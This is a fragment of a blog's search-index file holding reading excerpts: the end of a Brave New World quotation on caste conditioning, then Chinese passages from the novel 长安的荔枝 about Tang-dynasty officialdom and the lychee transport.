<li>“Alpha children wear grey. They work much harder than we do, because they’are so frightfully clever. I’m really awfuly glad I’m a Beta, because I don’t work so hard . and then we are much better than the Gammas and Deltas. Gammas are stupid. They all wear green, and Delta Children wear khaki. Oh no, I don’t want to play with Delta children. And Epsilons are still worse. They’re too stupid to… “</li>
</ul>
<h1 id="长安的荔枝"><a href="#长安的荔枝" class="headerlink" title="长安的荔枝"></a>长安的荔枝</h1><ul>
<li>京中除了两市的柜坊之外，要属几座大伽蓝的放贷最为便捷，谓之“香积钱”——当然，佛法不可沾染铜臭，所以这香积钱的本金唤做“功德”，利息唤做“福报”</li>
<li>既然路上有人管吃住，上林署支给的所谓“驿使钱”与“出食钱”，其实是用不着。使职的妙处就在这里，它超脱诸司流程之外，符宝司不会跟上林署对账，上林署也没办法问户部虚实，三处彼此并不联通</li>
<li>一碗熬得恰到好处的粟米肉羹粥，里头拌了碎杏仁与蔗饧，三碟淋了鸭油的清酱菜，一枚鸡子蒸白果，还有一合海藻酒。至于水果，干脆堆在食处门口，随意取用</li>
<li>韩承恨铁不成钢：“你把新鲜荔枝运来京城，可知道除了何履光之外，还会得罪多少人？那些衙署与何节帅一般心思，你做成了这件事，在圣人眼里，就是他们办事不得力。你那转运法是打他们的脸，人家又怎么会配合你做证呢</li>
<li>韩承摇头道：“你若在呈上转运法之时，附上一份谢表，说明此事有岭南经略使着力推动、度支同仁大力支持、太府司、司农寺、尚食局助力良多，你猜鱼朝恩还敢不敢抢你的功——良元兄呐，做官之道，其实就三句话：和光同尘，好处均沾，花花轿子众人齐抬。一个人吃独食，是吃不长久的。</li>
<li>小沙弥接过名刺看了眼，莫名其妙。幸亏韩承临走前提醒李善德，必要时可以故弄玄虚一下。他便鼓起勇气，冷着声音道：“把这名刺交给此间贵人便是，其他的你不要问</li>
<li>李善德刚要回答，脑子里突然闪过韩承下午教诲的为官之道：“和光同尘，好处均沾，花花轿子众人齐抬。” 一霎时福至心灵，悟性大亮，连忙躬身答道： “下官德薄力微，何敢觍颜承此重任。愿献与卫国公，乐见族亲和睦，足慰圣心。</li>
<li>李善德接了牌子，又讨问手书，以方便给相关衙署行去文牒。杨国忠一怔，不由得哈哈大笑：“你拿了我的牌子，还要照章发牒，岂不坏了本相的名声？——流程，是弱者才要遵循的规矩。</li>
<li>两百贯对百姓来说，是一世积蓄，对招福寺来说，只是做一次人情的成本罢了。</li>
<li>可这句解释听在苏谅耳朵里，根本就是欲盖弥彰。他一甩袖子，怒喝道：“好，好，大使你既如此，看来是小老自作多情了。就此别过！这寿辰礼物，就是丢海里好歹也能听个响！” 说完重新把锦盒抱在手里，转身离去。 李善德这才想起来，今天竟是自己生辰，真亏苏谅还记得。那个老胡商本是喜怒不形于色的老狐狸，这是把他当真朋友，才突然爆发出孩子似的脾气。</li>
<li>这是来自京城的文牒，来自于杨国忠本人。李善德正为双层瓮的事忙得晕头转向，这个指示便转去赵欣宁手里。文书内要求：六月初一运抵京城的荔枝数量，要追加到三十丛。 怎么会这样？万事即将具备，怎么上头又改需求？ 饶是李善德是个佛祖脾气，也差点破口大骂出来。他杨国忠知不知道，需求数量一变，所有的驿乘编组都得调整，所有的交接人马都得重配，工作量可不是一加一那么简单。</li>
<li>李善德是做过冰政的人，很了解这个体系的秉性。每到夏日，上头说要一块冰，中间为求安全，会按十块来调拨。下头执行的人为了更安全，总得备出二十块才放心。层层加码，步步增量，至于是否会造成浪费，并没人关心。</li>
<li>从岭南到长安之间的漫长驿路中，九成九的荔枝因为各种原因中途损毁了。从化出发的浩浩荡荡的队伍，最终抵达长安的，只有区区一骑、两坛。坛内应该摆放着各种竹节，节内塞满了荔枝</li>
<li>没过多久，一阵悠扬的钟声也加入这场合奏，那是招福寺的大钟，这种事他们可是从不落人后的。随后钟鼓齐鸣，交相嗡鸣，所有的庙宇、道观，所有的坊市都加入庆祝行列，整个城市陷入喜庆的狂欢。 李善德低下头，依靠着上好坊的残碑，继续专心读着眼前的纸卷。他的魂魄已在漫长的跋涉中磨蚀一空，失去了对城墙内侧那个绮丽世界的全部想象</li>
<li>“反正日后也要你来管，不妨现在说说好了。” 杨国忠背起手来，缓缓踱步，“荔枝转运的费用，其实是颇有为难的。从太府寺的藏署出并不合适，国用虽丰，自有法度，总要量入为出；而从内帑大盈库里拿，等于是从圣人的锦袋里掏钱，也不是不行，但咱们做臣子的，非但不为陛下分忧，反而去讨债，不是为臣之道。” 李善德的姿势一动不动，听得十分专注。 “所以在你奔忙转运之时，中书门下也发下一道牒文：要求沿途的都亭驿馆，所领长行宽延半年；附地的诸等农户，按丁口加派白直庸，准以荔枝钱折免。</li>
<li>御赐的这一篮子水果，虽不是什么紫衣金绶，可也比大唐律厉害多了。” “为什么？” “圣人刚打赏过的官员，你们转头就说他该判斩刑？是暗讽圣人识人不明么？</li>
</ul>
]]></content>
      <categories>
        <category>摘抄</category>
      </categories>
      <tags>
        <tag>摘抄</tag>
      </tags>
  </entry>
</search>
